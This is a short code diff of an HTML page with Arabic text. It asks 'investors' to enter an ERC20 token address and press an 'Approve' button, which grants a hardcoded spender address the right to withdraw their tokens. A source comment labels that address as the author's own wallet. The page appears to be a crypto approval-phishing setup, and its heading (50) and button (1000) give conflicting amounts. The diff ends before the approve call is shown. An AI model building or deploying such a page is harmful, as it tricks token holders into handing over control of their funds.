@@ -3,14 +3,16 @@
 <head>
   <meta charset="UTF-8" />
   <title>Approve 1000</title>
-  <script src="https://cdn.jsdelivr.net/npm/ethers@6.7.0/dist/ethers.min.js"></script>
 </head>
 <body>
-  <h2>المستثمرين - الموافقة على سحب 1000 من التوكن</h2>
+  <h2>المستثمرين - الموافقة على سحب 50 من التوكن</h2>
   <label>أدخل عنوان التوكن ERC20:</label><br>
   <input type="text" id="tokenAddress" placeholder="0x..." style="width:300px" />
   <br><br>
   <button id="approveBtn">اعمل Approve 1000</button>
+
+  <!-- تحميل مكتبة ethers.js -->
+  <script src="https://cdn.jsdelivr.net/npm/ethers@6.7.0/dist/ethers.umd.min.js"></script>
 
   <script>
     const spenderAddress = "0xaB63dd850a8C2EDD526fF2D929187B94E03F777D"; // محفظتك
